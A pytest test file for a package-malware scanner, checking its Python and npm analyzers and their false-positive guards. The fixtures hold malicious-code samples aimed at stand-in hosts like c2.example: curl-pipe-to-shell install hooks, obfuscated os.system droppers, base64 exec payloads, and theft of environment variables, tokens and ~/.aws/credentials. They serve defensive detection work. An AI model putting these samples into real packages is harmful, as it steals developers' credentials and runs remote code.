"""Behaviour of the individual analyzers, including false-positive guards and v1/v2 gating."""

from __future__ import annotations

import base64

from tests.conftest import rule_ids

SETUP_HEAD = "from setuptools import setup\n"


# ----------------------------------------------------------------------------- python
def test_exec_of_decoded_payload_is_high_and_the_payload_is_analysed(scan):
    payload = base64.b64encode(b'import urllib.request\nexec(urllib.request.urlopen("http://c2.example/x").read())\n').decode()
    r = scan({"pkg/__init__.py": f'import base64\nexec(base64.b64decode("{payload}"))\n'})
    ids = rule_ids(r)
    assert "PY-EXEC-DECODED" in ids and "OBF-ENCODED-PAYLOAD" in ids
    assert any(i.kind == "domain" and i.value == "c2.example" for i in r.iocs)
    assert r.verdict == "malicious"


def test_phase_matters_same_code_scores_higher_at_install_time(scan):
    body = 'import os, urllib.request\nurllib.request.urlopen(urllib.request.Request("http://c2.example", data=str(dict(os.environ)).encode()))\n'
    install = scan({"setup.py": SETUP_HEAD + body + 'setup(name="x")\n'})
    library = scan({"pkg/util.py": "def send():\n    " + body.replace("\n", "\n    ")})
    assert install.score > library.score
    assert install.verdict != "benign" and library.verdict == "benign"


def test_keyed_environ_access_is_not_a_bulk_dump(scan):
    r = scan({"pkg/__init__.py": 'import os, requests\n\ndef f():\n    requests.post(os.environ.get("URL", "x"), json={"t": os.getenv("T")})\n'})
    assert "PY-EXFIL" not in rule_ids(r)


def test_environ_copy_for_subprocess_alone_is_benign(scan):
    r = scan({"pkg/__init__.py": 'import os, subprocess\n\ndef f():\n    subprocess.run(["git", "status"], env=os.environ.copy())\n'})
    assert r.verdict == "benign"


def test_version_reading_exec_idiom_in_setup_py_is_not_flagged(scan):
    r = scan({"setup.py": SETUP_HEAD + 'ns = {}\nexec(open("pkg/version.py").read(), ns)\nsetup(name="x", version=ns["v"])\n'})
    assert "PY-EXEC-DYNAMIC" not in rule_ids(r)


def test_exec_of_a_non_py_data_file_is_still_flagged_in_v2(scan):
    r = scan({"setup.py": SETUP_HEAD + 'exec(open("payload.dat").read())\nsetup(name="x")\n', "payload.dat": "import os\n"})
    assert "PY-EXEC-DATA-FILE" in rule_ids(r)


def test_cmdclass_install_override_detected_but_build_ext_override_is_not(scan):
    hot = scan({"setup.py": SETUP_HEAD + "from setuptools.command.install import install\nclass P(install):\n    def run(self): pass\nsetup(name='x', cmdclass={'install': P})\n"})
    cold = scan({"setup.py": SETUP_HEAD + "from setuptools.command.build_ext import build_ext\nclass B(build_ext):\n    pass\nsetup(name='x', cmdclass={'build_ext': B})\n"})
    assert "PYPI-CMDCLASS-INSTALL-OVERRIDE" in rule_ids(hot)
    assert "PYPI-CMDCLASS-INSTALL-OVERRIDE" not in rule_ids(cold)


def test_unparseable_python_does_not_crash_and_falls_back(scan):
    r = scan({"setup.py": "print 'py2 only'\nexec(base64.b64decode('QUJD'))\n"})
    assert "PY-EXEC-DECODED" in rule_ids(r)          # regex fallback still sees the dropper shape


def test_getattr_dispatch_hidden_call_v1_misses_v2_catches(scan):
    files = {"setup.py": SETUP_HEAD + '_m = __import__("o" + "s")\n_f = getattr(_m, "sys" + "tem")\n_f("curl -s http://c2.example/i.sh | sh")\n'}
    assert scan(files, rules=1).verdict == "benign"
    r2 = scan(files, rules=2)
    assert r2.verdict == "malicious" and "PY-OBFUSCATED-CALL" in rule_ids(r2)


def test_folding_chr_join_and_reversal(scan):
    cmd = "curl -s http://c2.example/i.sh | sh"
    codes = ", ".join(str(ord(c)) for c in cmd)
    chr_join = {"setup.py": SETUP_HEAD + f'import os\nos.system("".join(chr(x) for x in [{codes}]))\n'}
    reversed_ = {"setup.py": SETUP_HEAD + f'import os\nos.system("{cmd[::-1]}"[::-1])\n'}
    assert scan(chr_join, rules=1).verdict == "benign" and scan(chr_join, rules=2).verdict != "benign"
    assert scan(reversed_, rules=2).verdict != "benign"


def test_selective_secret_env_keys_exfil_v2_only(scan):
    files = {"setup.py": SETUP_HEAD + 'import os, urllib.request\nk = ["NPM_TOKEN", "GITHUB_TOKEN"]\n'
             'urllib.request.urlopen("http://c2.example/", str([os.environ.get(x) for x in k]).encode())\nsetup(name="x")\n'}
    assert scan(files, rules=1).verdict == "benign"
    assert scan(files, rules=2).verdict != "benign"


def test_credential_client_with_runtime_network_is_not_a_stealer(scan):
    r = scan({"pkg/gh.py": 'import os, requests\n\ndef repo(o):\n    h = {"a": os.getenv("GITHUB_TOKEN")}\n    return requests.get("https://api.github.com/" + o, headers=h)\n'})
    assert r.verdict == "benign"


def test_path_join_credentials_resolved_in_v2(scan):
    files = {"pkg/__init__.py": 'import os, urllib.request\n\ndef _s():\n    p = os.path.join(os.path.expanduser("~"), ".aws", "credentials")\n    urllib.request.urlopen("http://c2.example/", open(p, "rb").read())\n\n_s()\n'}
    assert "PY-EXFIL" not in rule_ids(scan(files, rules=1))
    assert "PY-EXFIL" in rule_ids(scan(files, rules=2))


def test_import_graph_promotes_payload_module_to_import_phase(scan):
    r = scan({"pkg/__init__.py": "from ._t import go\n", "pkg/_t.py": 'import os, requests\n\ndef go():\n    requests.post("http://c2.example", data=open(os.path.expanduser("~/.aws/credentials")).read())\n\ngo()\n'})
    f = next(f for f in r.findings if f.rule_id == "PY-EXFIL")
    assert f.phase == "import"


def test_function_not_called_at_import_stays_runtime(scan):
    r = scan({"pkg/__init__.py": "from ._t import go\n", "pkg/_t.py": 'import os, requests\n\ndef go():\n    requests.post("http://c2.example", data=open(os.path.expanduser("~/.aws/credentials")).read())\n'})
    f = next(f for f in r.findings if f.rule_id == "PY-EXFIL")
    assert f.phase == "runtime"


# ------------------------------------------------------------------------- javascript / npm
def test_npm_download_exec_lifecycle_script(scan):
    pj = '{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl -s http://c2.example/i.sh | sh"}}'
    r = scan({"index.js": "1", "package.json": pj}, "npm")
    assert "SH-DOWNLOAD-EXEC" in rule_ids(r) and r.verdict == "malicious"


def test_benign_lifecycle_commands_are_ignored(scan):
    for cmd in ("node-gyp rebuild", "husky install", "prebuild-install || node-gyp rebuild", "echo thanks"):
        r = scan({"index.js": "1", "package.json": '{"name":"x","version":"1.0.0","scripts":{"install":"%s"}}' % cmd}, "npm")
        assert "NPM-LIFECYCLE-SCRIPT" not in rule_ids(r), cmd


def test_lifecycle_script_target_file_runs_at_install(scan):
    r = scan({"package.json": '{"name":"x","version":"1.0.0","scripts":{"postinstall":"node scripts/i.js"}}',
              "scripts/i.js": "const https=require('https');https.request({hostname:'c2.example'});JSON.stringify(process.env)"}, "npm")
    f = next(f for f in r.findings if f.rule_id == "JS-EXFIL")
    assert f.phase == "install"


def test_js_spawn_of_literal_binary_plus_update_check_is_not_fetch_and_run(scan):
    js = "const {spawn}=require('child_process');const https=require('https');\nhttps.get('https://registry.npmjs.org/x');\nspawn('git',['status'],{env:{...process.env}});\n"
    r = scan({"package.json": '{"name":"x","version":"1.0.0","bin":{"x":"cli.js"}}', "cli.js": js}, "npm")
    assert r.verdict == "benign"


def test_js_split_require_v1_misses_v2_catches(scan):
    files = {"package.json": '{"name":"x","version":"1.0.0","scripts":{"postinstall":"node i.js"}}',
             "i.js": "const cp = require('child' + '_process');\ncp['ex' + 'ecSync']('curl -s http://c2.example/i.sh | sh');\n"}
    assert scan(files, "npm", rules=1).verdict == "benign"
    assert scan(files, "npm", rules=2).verdict == "malicious"


def test_js_destructured_process_env_is_not_a_bulk_dump(scan):
    js = "const { HTTP_PROXY } = process.env;\nconst https = require('https');\nhttps.get('https://x.example/');\n"
    r = scan({"package.json": '{"name":"x","version":"1.0.0"}', "index.js": js}, "npm")
    assert "JS-EXFIL" not in rule_ids(r)


def test_obfuscator_identifiers_flagged_but_hex_escapes_alone_only_low(scan):
    obf = "var " + ",".join(f"_0x{i:04x}={i}" for i in range(12)) + ";"
    r = scan({"package.json": '{"name":"x","version":"1.0.0"}', "index.js": obf}, "npm")
    assert "JS-OBFUSCATED" in rule_ids(r)


# --------------------------------------------------------------------------- infra / iocs
def test_webhook_in_url_is_flagged_but_prose_mention_of_a_dropsite_is_not(scan):
    hook = scan({"index.js": "fetch('https://discord.com/api/webhooks/000000000000000001/FAKE-TOKEN')"}, "npm")
    prose = scan({"index.js": "// use transfer.sh or file.io to share logs\nmodule.exports = 1"}, "npm")
    assert "IOC-ABUSE-INFRA-WEBHOOK" in rule_ids(hook)
    assert not any(i.startswith("IOC-ABUSE-INFRA-DROPSITE") for i in rule_ids(prose))


def test_malformed_url_cannot_crash_the_scan(scan):
    r = scan({"pkg/__init__.py": 'X = "http://[::1"\nY = "http://[bad"\n'})
    assert r.verdict == "benign" and not any("error" in n for n in r.notes)


def test_hex_encoded_url_is_not_reported_as_code(scan):
    # GitHub's camo proxy hex-encodes image URLs; that must not look like a dropper
    url_hex = "https://f.cloud.github.com/assets/1/2/image.gif".encode().hex()
    r = scan({"index.js": f"// ![x](https://camo.githubusercontent.com/abc/{url_hex})\nmodule.exports = 1"}, "npm")
    assert r.verdict == "benign" and "OBF-ENCODED-PAYLOAD" not in {f.rule_id for f in r.findings if f.severity >= 2}


# ------------------------------------------------------------------------------ pth / metadata
def test_pth_executable_line_flagged_plain_path_line_not(scan):
    bad = scan({"evil.pth": "import os; exec(__import__('base64').b64decode('aW1wb3J0IG9z'))\n", "evil/__init__.py": ""})
    ok = scan({"ok.pth": "./some/path\n/another/path\n", "ok/__init__.py": ""})
    assert "PTH-EXEC-LINE" in rule_ids(bad) and "PTH-EXEC-LINE" not in rule_ids(ok)


def test_dependency_confusion_version_shape(scan):
    assert "PKG-VERSION-ANOMALY" in rule_ids(scan({"setup.py": "x=1"}, name="acme-internal-auth", version="99.9.9"))
    assert "PKG-VERSION-ANOMALY" not in rule_ids(scan({"setup.py": "x=1"}, name="certifi", version="2024.2.2"))   # CalVer
    assert "PKG-VERSION-ANOMALY" not in rule_ids(scan({"setup.py": "x=1"}, name="normal", version="2.31.0"))


def test_npm_remote_tarball_dependency(scan):
    pj = '{"name":"x","version":"1.0.0","dependencies":{"lodash":"https://evil.example/lodash.tgz"}}'
    assert "NPM-REMOTE-DEP" in rule_ids(scan({"index.js": "1", "package.json": pj}, "npm"))
